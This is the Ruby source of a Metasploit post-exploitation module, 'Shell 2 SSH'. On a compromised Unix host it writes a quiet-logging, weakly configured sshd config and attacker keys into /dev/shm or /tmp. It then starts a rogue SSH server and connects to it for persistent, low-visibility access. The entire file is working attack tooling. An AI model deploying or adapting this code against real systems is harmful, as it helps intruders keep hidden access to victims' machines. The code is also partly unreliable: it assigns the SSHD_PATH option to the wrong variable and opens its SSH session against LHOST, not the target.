#
#
#
#

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  include Msf::Post::Unix::Commands

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Shell 2 SSH',
                      'Description'   => %q(Starting a new ssh server using a custom config and connect to it),
                      'Author'        => [ 'jot'],
                      'SessionTypes'  => [ 'shell' ]))
    register_options(
      [
        OptAddress.new('LHOST',
                       [false, 'IP of host that will receive the SSH connection (will try to auto detect).', nil]),
        OptPort.new('SSHD_PORT', [ true, 'Port number the SSH Server should listen', 2222]),
        OptString.new('USERNAME', [ false, 'The username to login  (will try to auto detect)' ]),
        OptPath.new('WRITEDIR', [ false,  'Path of a wirteable directory  (usually /tmp; will try to auto detect)' ]),
        OptPath.new('SSHD_PATH', [ false, 'Path of SSHD binary  (usually "/usr/sbin/sshd" will try to auto detect)' ])
      ], self.class
    )

    @post_data = nil
  end

  def run
    # Try hard to find a valid LHOST value in order to
    # make running 'sessions -u' as robust as possible.
    lhost = if datastore['LHOST']
              datastore['LHOST']
            elsif framework.datastore['LHOST']
              framework.datastore['LHOST']
            else
              session.tunnel_local.split(':')[0]
            end
    # If nothing else works...
    lhost = Rex::Socket.source_address if lhost.blank?
    if (lhost == 'local') || lhost.to_s.empty?
      print_error('LHOST empty')
      raise ArgumentError
    end
    lport = datastore['SSHD_PORT']

    # username
    if datastore['USERNAME']
      username = datastore['USERNAME']
    else
      vprint_status("Getting current username")
      username = get_username
    end
    username = username.to_s.strip
    if username.empty?
      print_error('Username empty')
      raise ArgumentError
    end

    # writeable directory
    directories = {
      1 => '/dev/shm',
      2 => '/tmp',
      3 => '/var/tmp',
      99 => '.'
    }
    if datastore['WRITEDIR']
      tmpdir = datastore['WRITEDIR']
    else
      vprint_status("Getting writeable directory")
      directories.sort.each do |pair|
        dir = pair[1]
        if (directory? dir) && (writeable? dir)
          tmpdir = dir
          break
        end
      end
    end
    tmpdir = tmpdir.to_s.strip
    if tmpdir.empty?
      print_error('No writeable directory found')
      raise ArgumentError
    end

    ####################
    # sshd path
    sshd_path = nil
    default_path = {
      1 => '/usr/sbin/sshd',
      2 => '/usr/local/sbin/sshd',
      3 => '/sbin/sshd'
    }
    if datastore['SSHD_PATH']
      tmpdir = datastore['SSHD_PATH']
    else
      vprint_status("Getting path of sshd")
      default_path.sort.each do |pair|
        path = pair[1]
        if file? path
          sshd_path = path
          break
        end
      end
    end
    sshd_path = sshd_path.to_s.strip
    if sshd_path.empty?
      print_error('No SSH Server path found')
      raise ArgumentError
    end
    ####################
    #
    vprint_status("Generating SSH key")
    (ssh_key_priv, ssh_key_pub) = generate_ssh_key

    loot_path = store_loot("ssh_key", "text/plain", session, ssh_key_priv, "ssh_key", "SSH Key for started SSHd")
    ::File.chmod(0600, loot_path) # for using ssh client direct
    print_good("SSH Key is stored in #{loot_path}")

    ###################
    #
    vprint_status("Generating SSHD config")
    sshd_config_path = "#{tmpdir}/#{::Rex::Text.rand_text_alpha(8)}"
    rsa_key = "#{tmpdir}/#{::Rex::Text.rand_text_alpha(8)}"
    dsa_key = "#{tmpdir}/#{::Rex::Text.rand_text_alpha(8)}"
    auth_file = "#{tmpdir}/#{::Rex::Text.rand_text_alpha(8)}"
    pid = "#{tmpdir}/#{::Rex::Text.rand_text_alpha(8)}"
    sshd_config = generate_sshd_config(lport, rsa_key, dsa_key, auth_file, pid)

    vprint_status("Uploading SSHD config")
    write_file(sshd_config_path, sshd_config)
    # write_file(rsa_key, generate_sshd_rsa)
    (sshd_rsa_key, sshd_rsa_pub) = generate_sshd_rsa
    write_file(rsa_key, sshd_rsa_key)
    pub_path = store_loot("sshd_pub", "text/plain", session, "[#{lhost}]:#{lport} #{sshd_rsa_pub}", "sshd_pub", "Public key of this SSHD")

    # write_file(dsa_key, generate_sshd_dsa)
    (sshd_dsa_key, sshd_dsa_pub) = generate_sshd_dsa
    write_file(dsa_key, sshd_dsa_key)

    write_file(auth_file, ssh_key_pub)

    cmd_exec("chmod 600 #{rsa_key}")
    cmd_exec("chmod 600 #{dsa_key}")

    ###################
    #
    cmd = "#{sshd_path} -q -f  #{sshd_config_path}"
    out = cmd_exec(cmd)
    vprint_status("Starting SSHD (\"#{cmd}\")\n#{out}")
    print_good("SSHd started")
    if file? pid
      print_good("SSHd running")
    else
      print_error("Could not start SSHD \"#{cmd}\"")
    end

    print_good("To login manually you run:\nssh -i #{loot_path}  -p #{lport} #{username}@#{lhost} -o UserKnownHostsFile=#{pub_path}")

    ####################
    #
    #    rm_f sshd_config_path
    #    rm_f pid

    ####################
    #
    new_ssh_session = framework.auxiliary.create("shell/ssh_session")
    new_ssh_session.datastore['RHOSTS'] = lhost
    new_ssh_session.datastore['RPORT'] = lport
    new_ssh_session.datastore['USERNAME'] = username
    new_ssh_session.datastore['SSH_KEYFILE'] = loot_path
    new_ssh_session.datastore['SSH_KNOWN_HOST_FILE'] = pub_path
    new_ssh_session.options.validate(new_ssh_session.datastore)
    new_ssh_session.run_simple(
      'LocalInput' => user_input,
      'LocalOutput' => user_output
    )
  end

  def get_username
    out = cmd_exec("whoami")
    out
  end

  def generate_sshd_config(lport, rsa_key, dsa_key, auth_file, pid)
    sshd_config = <<END_OF_SSHD
Port #{lport}
Protocol 2
HostKey #{rsa_key}
HostKey #{dsa_key}
SyslogFacility USER
LogLevel QUIET
AllowUsers *
StrictModes no
RSAAuthentication yes
DSAAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile      #{auth_file}
RhostsRSAAuthentication no
HostbasedAuthentication no
IgnoreRhosts yes
PasswordAuthentication no
UsePAM no
AllowTcpForwarding yes
X11Forwarding yes
X11DisplayOffset 10
X11UseLocalhost yes
PrintMotd no
PrintLastLog no
PidFile #{pid}
Ciphers aes256-cbc
KexAlgorithms diffie-hellman-group1-sha1

END_OF_SSHD
    sshd_config
  end

  def generate_sshd_rsa
    key = OpenSSL::PKey::RSA.generate(2048)
    # key.to_s
    type = key.ssh_type
    data = [ key.to_blob ].pack('m0')
    [key, "#{type} #{data}"]
  end

  def generate_sshd_dsa
    key = OpenSSL::PKey::DSA.generate(2048)
    # key.to_s
    type = key.ssh_type
    data = [ key.to_blob ].pack('m0')
    [key, "#{type} #{data}"]
  end

  def generate_ssh_key
    key = OpenSSL::PKey::RSA.new 2048
    type = key.ssh_type
    data = [ key.to_blob ].pack('m0')
    [key, "#{type} #{data}"]
  end
end
